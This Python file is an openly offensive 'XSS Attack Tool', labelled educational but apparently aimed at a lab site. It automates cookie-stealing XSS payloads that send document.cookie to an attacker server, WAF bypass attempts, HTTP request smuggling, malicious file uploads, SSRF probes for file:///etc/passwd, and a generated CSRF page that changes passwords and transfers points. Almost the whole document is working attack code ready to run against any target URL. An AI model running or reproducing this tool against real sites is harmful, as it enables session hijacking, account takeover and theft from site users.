#!/usr/bin/env python3
"""
XSS Attack Tool v2.0 - Apache POST 403 Bypass Edition
Educational purposes only!
"""

import requests
from bs4 import BeautifulSoup
import time
import json
import re
from datetime import datetime
import random
import base64
import os
import socket
from urllib.parse import urlparse, parse_qs, urlencode

class XSSAttackToolV2:
    def __init__(self, target_url, attacker_server):
        self.target_url = target_url.rstrip('/')
        self.attacker_server = attacker_server.rstrip('/')
        self.session = requests.Session()
        self.logged_in = False
        self.vulnerabilities = []
        self.successful_payloads = []
        
        # User-Agent 설정
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def login(self, username="bob", password="bobby123"):
        """타겟 사이트 로그인"""
        login_url = f"{self.target_url}/login.php"
        print(f"[*] Attempting login with {username}/{password}")

        data = {'username': username, 'password': password}
        response = self.session.post(login_url, data=data, allow_redirects=True)

        if 'index.php' in response.url or response.status_code == 200:
            print("[+] Login successful!")
            self.logged_in = True
            return True
        else:
            print("[-] Login failed!")
            return False

    def test_get_injection(self):
        """GET 메소드로 XSS 시도"""
        print("\n[*] Testing GET parameter injection...")
        
        # 일반적인 GET 파라미터 엔드포인트
        test_endpoints = [
            '/search.php?q=',
            '/index.php?page=',
            '/profile.php?name=',
            '/view.php?id=',
            '/user.php?user=',
            '/comment.php?text=',
            '/filter.php?category=',
            '/sort.php?order=',
            '/display.php?msg=',
            '/error.php?err='
        ]
        
        # XSS 페이로드
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "';alert(1);//",
            'javascript:alert(1)',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<img src=x onerror="location=\'' + self.attacker_server + '/steal?c=\'+document.cookie">',
            '"><img src=x onerror="new Image().src=\'' + self.attacker_server + '/steal?c=\'+document.cookie">'
        ]
        
        found_vulns = []
        
        for endpoint in test_endpoints:
            for payload in xss_payloads:
                try:
                    test_url = f"{self.target_url}{endpoint}{requests.utils.quote(payload)}"
                    response = self.session.get(test_url)
                    
                    # XSS 성공 확인
                    if any(indicator in response.text for indicator in ['<script>', 'onerror=', 'onload=', 'javascript:']):
                        if payload in response.text:
                            print(f"[+] GET XSS FOUND: {endpoint}")
                            print(f"    Payload: {payload}")
                            found_vulns.append({
                                'url': test_url,
                                'endpoint': endpoint,
                                'payload': payload
                            })
                            break
                except Exception as e:
                    pass
                
                time.sleep(0.2)
        
        return found_vulns

    def test_alternative_methods(self):
        """다른 HTTP 메소드로 우회"""
        print("\n[*] Testing alternative HTTP methods...")
        
        methods = ['PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS', 'TRACE']
        test_payload = '<script>alert(1)</script>'
        working_methods = []
        
        for method in methods:
            try:
                response = self.session.request(
                    method=method,
                    url=f"{self.target_url}/new_post.php",
                    data={'content': test_payload}
                )
                
                print(f"[*] {method}: {response.status_code}")
                
                if response.status_code not in [403, 405, 501]:
                    print(f"[+] {method} method might work!")
                    working_methods.append(method)
                    
                    # 실제 주입 시도
                    if response.status_code == 200:
                        check_response = self.session.get(f"{self.target_url}/index.php")
                        if test_payload in check_response.text:
                            print(f"[+] XSS via {method} successful!")
                            self.successful_payloads.append({
                                'method': method,
                                'payload': test_payload
                            })
                            
            except Exception as e:
                pass
            
            time.sleep(0.5)
        
        return working_methods

    def test_content_type_bypass(self):
        """Content-Type 헤더 변경으로 우회"""
        print("\n[*] Testing Content-Type bypass...")
        
        content_types = [
            ('application/json', 'json'),
            ('text/plain', 'plain'),
            ('application/xml', 'xml'),
            ('multipart/form-data', 'multipart'),
            ('application/x-www-form-urlencoded', 'form'),
            ('text/html', 'html'),
            ('application/octet-stream', 'binary')
        ]
        
        payload = f'<img src=x onerror="new Image().src=\'{self.attacker_server}/steal?c=\'+document.cookie">'
        working_types = []
        
        for content_type, format_type in content_types:
            headers = {'Content-Type': content_type}
            
            # 데이터 포맷 변경
            if format_type == 'json':
                data = json.dumps({'content': payload})
            elif format_type == 'xml':
                data = f'<?xml version="1.0"?><root><content>{payload}</content></root>'
            elif format_type == 'multipart':
                files = {'content': (None, payload)}
                response = self.session.post(
                    f"{self.target_url}/new_post.php",
                    files=files
                )
            else:
                data = f'content={payload}'
            
            if format_type != 'multipart':
                response = self.session.post(
                    f"{self.target_url}/new_post.php",
                    data=data,
                    headers=headers
                )
            
            print(f"[*] {content_type}: {response.status_code}")
            
            if response.status_code != 403:
                print(f"[+] Bypass with Content-Type: {content_type}")
                working_types.append(content_type)
                
                # 실제 주입 확인
                check = self.session.get(f"{self.target_url}/index.php")
                if 'onerror=' in check.text:
                    print(f"[+] XSS injected with {content_type}!")
                    self.successful_payloads.append({
                        'content_type': content_type,
                        'payload': payload
                    })
            
            time.sleep(0.5)
        
        return working_types

    def test_case_encoding_bypass(self):
        """대소문자와 인코딩으로 우회"""
        print("\n[*] Testing case and encoding bypass...")
        
        # 다양한 인코딩 방법
        test_payloads = [
            # URL 인코딩
            '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
            
            # 이중 URL 인코딩
            '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
            
            # HTML 엔티티
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            
            # 유니코드
            '\u003Cscript\u003Ealert(1)\u003C/script\u003E',
            
            # 대소문자 혼합
            '<ScRiPt>alert(1)</sCrIpT>',
            
            # Hex 인코딩
            '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            
            # 탭과 줄바꿈
            '<script\t>alert(1)</script\n>',
            
            # 주석 삽입
            '<scr/**/ipt>alert(1)</scr/**/ipt>'
        ]
        
        working_payloads = []
        
        # 메소드 대소문자 테스트
        methods = ['post', 'Post', 'POST', 'PoSt', 'pOsT']
        
        for method in methods:
            try:
                response = self.session.request(
                    method=method,
                    url=f"{self.target_url}/new_post.php",
                    data={'content': 'test'}
                )
                if response.status_code != 403:
                    print(f"[+] Method case bypass: {method}")
                    working_payloads.append(f"method: {method}")
            except:
                pass
        
        # 인코딩 테스트
        for payload in test_payloads:
            response = self.session.post(
                f"{self.target_url}/new_post.php",
                data={'content': payload}
            )
            
            if response.status_code != 403:
                print(f"[+] Encoding bypass: {payload[:30]}...")
                working_payloads.append(payload)
            
            time.sleep(0.3)
        
        return working_payloads

    def test_http_smuggling(self):
        """HTTP Request Smuggling 공격"""
        print("\n[*] Testing HTTP Request Smuggling...")
        
        # URL 파싱
        parsed = urlparse(self.target_url)
        host = parsed.hostname
        port = parsed.port or 80
        
        smuggling_payloads = [
            # CL.TE smuggling
            f"""POST /new_post.php HTTP/1.1\r
Host: {host}\r
Content-Length: 6\r
Transfer-Encoding: chunked\r
\r
0\r
\r
POST /new_post.php HTTP/1.1\r
Host: {host}\r
Content-Length: 50\r
\r
content=<script>alert(1)</script>\r
\r
""",
            
            # TE.CL smuggling
            f"""POST /new_post.php HTTP/1.1\r
Host: {host}\r
Transfer-Encoding: chunked\r
Content-Length: 4\r
\r
2e\r
content=<script>alert(1)</script>\r
0\r
\r
"""
        ]
        
        for i, payload in enumerate(smuggling_payloads):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))
                s.send(payload.encode())
                response = s.recv(4096).decode()
                
                if '200 OK' in response:
                    print(f"[+] Smuggling attempt {i+1} got 200 OK")
                else:
                    print(f"[-] Smuggling attempt {i+1} failed")
                
                s.close()
            except Exception as e:
                print(f"[-] Smuggling error: {str(e)}")
            
            time.sleep(1)

    def test_file_upload_bypass(self):
        """파일 업로드로 우회"""
        print("\n[*] Testing file upload bypass...")
        
        # 파일 업로드 엔드포인트 찾기
        upload_endpoints = [
            '/upload.php',
            '/avatar.php',
            '/profile_pic.php',
            '/attachment.php',
            '/file.php',
            '/media.php'
        ]
        
        xss_payload = f'<script>new Image().src="{self.attacker_server}/steal?c="+document.cookie</script>'
        
        for endpoint in upload_endpoints:
            try:
                # 다양한 파일 형식으로 시도
                files_to_try = [
                    ('file', ('xss.html', xss_payload, 'text/html')),
                    ('file', ('xss.svg', f'<svg onload="alert(1)">{xss_payload}</svg>', 'image/svg+xml')),
                    ('file', ('xss.txt', xss_payload, 'text/plain')),
                    ('file', ('xss.jpg', xss_payload, 'image/jpeg')),
                    ('avatar', ('avatar.gif', f'GIF89a{xss_payload}', 'image/gif'))
                ]
                
                for file_param, file_data in files_to_try:
                    files = {file_param: file_data}
                    response = self.session.post(
                        f"{self.target_url}{endpoint}",
                        files=files
                    )
                    
                    if response.status_code == 200:
                        print(f"[+] File upload successful at {endpoint}")
                        print(f"    File type: {file_data[2]}")
                        
                        # 업로드된 파일 경로 찾기
                        if 'location' in response.headers:
                            print(f"    Uploaded to: {response.headers['location']}")
                        
            except Exception as e:
                pass
            
            time.sleep(0.5)

    def find_reflected_xss(self):
        """반사형 XSS 취약점 찾기"""
        print("\n[*] Searching for Reflected XSS...")
        
        # 메인 페이지에서 모든 링크와 폼 수집
        response = self.session.get(f"{self.target_url}/index.php")
        soup = BeautifulSoup(response.text, 'html.parser')
        
        reflected_vulns = []
        
        # GET 파라미터가 있는 링크 찾기
        for link in soup.find_all('a', href=True):
            if '?' in link['href']:
                parsed = urlparse(link['href'])
                params = parse_qs(parsed.query)
                
                for param in params:
                    # XSS 테스트
                    test_payloads = [
                        f'"><script>alert(1)</script>',
                        f'<img src=x onerror=alert(1)>',
                        f'javascript:alert(1)',
                        f'\';alert(1);//'
                    ]
                    
                    for payload in test_payloads:
                        new_params = params.copy()
                        new_params[param] = [payload]
                        new_query = urlencode(new_params, doseq=True)
                        test_url = f"{self.target_url}{parsed.path}?{new_query}"
                        
                        try:
                            test_response = self.session.get(test_url)
                            if payload in test_response.text:
                                print(f"[+] Reflected XSS found!")
                                print(f"    URL: {test_url}")
                                print(f"    Param: {param}")
                                reflected_vulns.append({
                                    'url': test_url,
                                    'param': param,
                                    'payload': payload
                                })
                                break
                        except:
                            pass
                        
                        time.sleep(0.2)
        
        # 폼 찾기
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            
            if method == 'get':
                inputs = form.find_all(['input', 'textarea'])
                for input_field in inputs:
                    name = input_field.get('name', '')
                    if name:
                        test_payload = '<img src=x onerror=alert(1)>'
                        test_url = f"{self.target_url}/{action}?{name}={requests.utils.quote(test_payload)}"
                        
                        try:
                            response = self.session.get(test_url)
                            if test_payload in response.text:
                                print(f"[+] Form XSS found: {action}")
                                reflected_vulns.append({
                                    'form': action,
                                    'input': name,
                                    'payload': test_payload
                                })
                        except:
                            pass
        
        return reflected_vulns

    def test_dom_xss(self):
        """DOM 기반 XSS 찾기"""
        print("\n[*] Testing DOM-based XSS...")
        
        # DOM XSS 페이로드
        dom_payloads = [
            '#<img src=x onerror=alert(1)>',
            '#"><script>alert(1)</script>',
            '#javascript:alert(1)',
            '?search=<img src=x onerror=alert(1)>',
            '&redirect=javascript:alert(1)',
            '#\';alert(1);//'
        ]
        
        dom_vulns = []
        
        # 메인 페이지에서 JavaScript 코드 분석
        response = self.session.get(f"{self.target_url}/index.php")
        
        # JavaScript에서 취약한 패턴 찾기
        vulnerable_patterns = [
            r'location\.hash',
            r'document\.write',
            r'innerHTML\s*=',
            r'eval\(',
            r'setTimeout\(',
            r'setInterval\(',
            r'Function\(',
            r'\.html\(',
            r'\.append\('
        ]
        
        for pattern in vulnerable_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                print(f"[!] Potential DOM XSS pattern found: {pattern}")
                dom_vulns.append(pattern)
        
        # URL 프래그먼트 테스트
        for payload in dom_payloads:
            test_url = f"{self.target_url}/index.php{payload}"
            print(f"[*] Testing: {test_url}")
        
        return dom_vulns

    def create_csrf_poc(self):
        """CSRF PoC 생성"""
        print("\n[*] Creating CSRF PoC...")
        
        csrf_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
    <meta charset="utf-8">
</head>
<body>
    <h1>CSRF Attack PoC</h1>
    
    <!-- GET 기반 CSRF -->
    <img src="{self.target_url}/transfer_points.php?to=attacker&amount=1000" style="display:none">
    <img src="{self.target_url}/change_password.php?new_password=hacked123" style="display:none">
    <img src="{self.target_url}/delete_post.php?id=1" style="display:none">
    
    <!-- GET XSS 시도 -->
    <img src="{self.target_url}/search.php?q=<script>alert(1)</script>" style="display:none">
    <img src="{self.target_url}/profile.php?bio=<img src=x onerror=alert(1)>" style="display:none">
    
    <!-- 자동 리다이렉트 -->
    <script>
        // XSS 페이로드가 있는 URL로 리다이렉트
        setTimeout(() => {{
            window.location = '{self.target_url}/search.php?q=' + encodeURIComponent('<img src=x onerror="new Image().src=\\'{self.attacker_server}/steal?c=\\'+document.cookie">');
        }}, 2000);
    </script>
    
    <!-- 숨겨진 iframe -->
    <iframe src="{self.target_url}/profile.php?name=<script>alert(1)</script>" style="display:none"></iframe>
</body>
</html>"""
        
        # PoC 파일 저장
        with open('csrf_poc.html', 'w', encoding='utf-8') as f:
            f.write(csrf_html)
        
        print("[+] CSRF PoC saved as csrf_poc.html")
        
        return csrf_html

    def test_ssrf_bypass(self):
        """SSRF를 통한 우회"""
        print("\n[*] Testing SSRF bypass...")
        
        ssrf_endpoints = [
            '/proxy.php',
            '/fetch.php',
            '/curl.php',
            '/get.php',
            '/load.php',
            '/url.php',
            '/redirect.php',
            '/image.php'
        ]
        
        # SSRF 페이로드
        ssrf_urls = [
            'http://127.0.0.1/new_post.php',
            'http://localhost/new_post.php',
            'http://[::1]/new_post.php',
            'http://0.0.0.0/new_post.php',
            'file:///etc/passwd',
            f'{self.attacker_server}/evil.js'
        ]
        
        for endpoint in ssrf_endpoints:
            for ssrf_url in ssrf_urls:
                try:
                    # GET 파라미터로 시도
                    params = ['url', 'target', 'link', 'src', 'href', 'page', 'file']
                    
                    for param in params:
                        test_url = f"{self.target_url}{endpoint}?{param}={requests.utils.quote(ssrf_url)}"
                        response = self.session.get(test_url)
                        
                        if response.status_code == 200:
                            print(f"[+] SSRF endpoint found: {endpoint}?{param}=")
                            
                            # POST 시도
                            post_data = {'content': '<script>alert(1)</script>'}
                            ssrf_post = f"{self.target_url}{endpoint}?{param}={requests.utils.quote('http://localhost/new_post.php')}"
                            post_response = self.session.post(ssrf_post, data=post_data)
                            
                            if post_response.status_code != 403:
                                print(f"[+] SSRF POST bypass successful!")
                                self.successful_payloads.append({
                                    'type': 'SSRF',
                                    'endpoint': f"{endpoint}?{param}="
                                })
                except:
                    pass
                
                time.sleep(0.3)

    def generate_report(self):
        """공격 결과 리포트 생성"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        report = f"""
===================================================
        XSS Attack Tool v2.0 - Report
===================================================
Target: {self.target_url}
Attacker Server: {self.attacker_server}
Timestamp: {timestamp}
===================================================

Apache POST 403 Bypass Results:

"""
        
        if self.successful_payloads:
            report += f"Successful Attacks: {len(self.successful_payloads)}\n\n"
            for i, attack in enumerate(self.successful_payloads, 1):
                report += f"{i}. Attack Type: {attack.get('type', 'XSS')}\n"
                for key, value in attack.items():
                    if key != 'type':
                        report += f"   {key}: {value}\n"
                report += "\n"
        else:
            report += "No successful direct attacks found.\n"
            report += "Consider using CSRF or social engineering.\n"
        
        # 발견된 취약점
        if self.vulnerabilities:
            report += "\n\nPotential Vulnerabilities:\n"
            report += "="*50 + "\n"
            for vuln in self.vulnerabilities:
                report += f"- {vuln}\n"
        
        # 권장사항
        report += "\n\nRecommendations:\n"
        report += "="*50 + "\n"
        report += "1. Try GET-based XSS attacks\n"
        report += "2. Use CSRF to bypass POST restrictions\n"
        report += "3. Look for file upload vulnerabilities\n"
        report += "4. Test alternative HTTP methods\n"
        report += "5. Check for SSRF vulnerabilities\n"
        
        # 리포트 저장
        report_dir = "xss_reports"
        os.makedirs(report_dir, exist_ok=True)
        report_filename = f"xss_report_v2_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        report_path = os.path.join(report_dir, report_filename)
        
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(report)
        
        print(f"\n[+] Report saved: {report_filename}")
        
        return report_filename

    def run(self):
        """메인 실행 함수"""
        print("\n" + "="*60)
        print("         XSS Attack Tool v2.0")
        print("         Apache POST 403 Bypass Edition")
        print("="*60)
        print(f"Target: {self.target_url}")
        print(f"Attacker Server: {self.attacker_server}")
        print("="*60)
        
        # 1. 로그인
        if not self.login():
            print("[-] Login failed. Some tests may not work properly.")
        
        # 2. GET 메소드 XSS 테스트
        print("\n[Phase 1] GET Method XSS Testing")
        get_vulns = self.test_get_injection()
        if get_vulns:
            print(f"[+] Found {len(get_vulns)} GET XSS vulnerabilities!")
            self.vulnerabilities.extend(get_vulns)
        
        # 3. 대체 HTTP 메소드 테스트
        print("\n[Phase 2] Alternative HTTP Methods")
        alt_methods = self.test_alternative_methods()
        
        # 4. Content-Type 우회
        print("\n[Phase 3] Content-Type Bypass")
        ct_bypass = self.test_content_type_bypass()
        
        # 5. 인코딩 우회
        print("\n[Phase 4] Encoding Bypass")
        enc_bypass = self.test_case_encoding_bypass()
        
        # 6. HTTP Smuggling
        print("\n[Phase 5] HTTP Request Smuggling")
        self.test_http_smuggling()
        
        # 7. 파일 업로드
        print("\n[Phase 6] File Upload Testing")
        self.test_file_upload_bypass()
        
        # 8. 반사형 XSS
        print("\n[Phase 7] Reflected XSS")
        reflected = self.find_reflected_xss()
        if reflected:
            self.vulnerabilities.extend(reflected)
        
        # 9. DOM XSS
        print("\n[Phase 8] DOM-based XSS")
        dom_vulns = self.test_dom_xss()
        
        # 10. SSRF
        print("\n[Phase 9] SSRF Testing")
        self.test_ssrf_bypass()
        
        # 11. CSRF PoC 생성
        print("\n[Phase 10] CSRF PoC Generation")
        self.create_csrf_poc()
        
        # 12. 리포트 생성
        print("\n[*] Generating report...")
        self.generate_report()
        
        # 결과 요약
        print("\n" + "="*60)
        print("ATTACK SUMMARY:")
        print("="*60)
        
        if self.successful_payloads:
            print(f"[+] Successful attacks: {len(self.successful_payloads)}")
            for attack in self.successful_payloads:
                print(f"    - {attack}")
        else:
            print("[-] No direct XSS attacks succeeded due to Apache POST 403")
            print("[!] But we found alternative attack vectors:")
            print("    - CSRF PoC created (csrf_poc.html)")
            if get_vulns:
                print(f"    - {len(get_vulns)} GET-based XSS vulnerabilities")
            if reflected:
                print(f"    - {len(reflected)} Reflected XSS vulnerabilities")
            if dom_vulns:
                print(f"    - {len(dom_vulns)} potential DOM XSS patterns")
        
        print("\n[*] Attack complete!")
        print("[*] Check the xss_reports/ directory for detailed results")


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python3 xss_tool2.py <target_url> <attacker_server>")
        print("Example: python3 xss_tool2.py http://vulnerable.com http://attacker.com")
        sys.exit(1)
    
    target = sys.argv[1]
    attacker = sys.argv[2]
    
    # XSS 공격 도구 실행
    tool = XSSAttackToolV2(target, attacker)
    tool.run()